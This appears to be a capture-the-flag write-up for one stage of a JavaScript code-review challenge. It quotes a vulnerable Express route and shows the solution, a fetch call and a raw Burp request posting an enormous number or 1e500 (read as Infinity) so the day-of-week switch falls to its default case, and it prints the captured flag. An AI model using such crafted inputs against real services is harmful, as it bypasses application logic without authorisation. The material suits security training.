We heard you like JavaScript? So we scrambled some nice JavaScript â˜• code for you to review! Review the provided code snippet and send appropriate API request to get the flag!

Code:

```js
router.post('/api/stages/4', async (req, res) => {
    const { days } = req.body;

    if ( typeof days !== "number" ) {
        return res.status(401).json({ message: 'Only days in number is accepted!' });
    }

    let dayOfWeek = Math.abs(parseInt(days) % 7);

    switch(dayOfWeek) {
        case 0:
            day = "Saturday";
            break;
        case 1:
            day = "Sunday";
            break;
        case 2:
            day = "Monday";
            break;
        case 3:
            day = "Tuesday";
            break;
        case 4:
            day = "Wednesday";
            break;
        case 5:
            day = "Thursday";
            break;
        case 6:
            day = "Friday";
            break
        default:
            day = "Payday";
    }

    if (day == "Payday" ) {
        return res.json({ flag: flags[3] });
    }

    return res.status(401).json({ message: 'No flag for you!' });
});
```

Password Condition:

Break out of the Case statement. 

Previous Stage Snippet modified:

```javascript
fetch('http://js.pwn.site:1995/api/stages/4', {
  method: 'POST', // or 'PUT'
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    days: 45,
  }),
})
.then(response => response.json())
.then(data => console.log(data))
.catch((error) => {
  console.error('Error:', error);
});
```

Same snippet in Burp:

```http
POST /api/stages/4 HTTP/1.1
Host: js.pwn.site:1995
Accept: application/json
Connection: close
Content-Type: application/json
Content-Length: 17

{
  "days":334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345334353453453453454353453453453453453453453345345345345345345345345353453453543543553453434535345395830958039458034580395830495803945830498503453453534243523454234523453452345234523452345234523452345235234523452345
}
}
```

Can also use Infinity, but must have it as JSON formatted infinity.

```javascript
console.log(1e500); // Gives Infinity

Or

JSON.parse('{"number": 1e500}'); // Gives {number: Infinity}
```

Flag:

flag{t00-biiiig-to-handle!}